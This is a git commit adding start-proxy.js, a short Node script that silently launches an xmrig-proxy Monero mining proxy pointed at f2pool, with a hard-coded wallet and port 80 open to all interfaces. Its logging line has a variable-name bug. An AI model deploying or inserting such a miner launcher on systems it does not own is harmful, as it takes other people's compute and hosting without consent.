a0e0349648e26df04f535ba5803a9f2744337965
vippro99 <80774966+vippro99@users.noreply.github.com>
2021-04-02 22:25:50 +0700

    Create start-proxy.js

---
+++ start-proxy.js
@@ -0,0 +1,11 @@
+const shell = require('shelljs');
+
+const runJob = () => {
+    const runMonney = shell.exec('./xmrig-proxy -r 2 -R 1 --donate-level 1 -b 0.0.0.0:80 --workers ip -o xmr.f2pool.com:13531 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p x -k --coin monero -a rx/0', { silent: true, async: true });
+    if (runMonney.code !== undefined) {
+        return 0;
+    }
+    runMonney.stdout.on('data', (rawLog) => {
+        console.log(rawlog)
+    });
+}
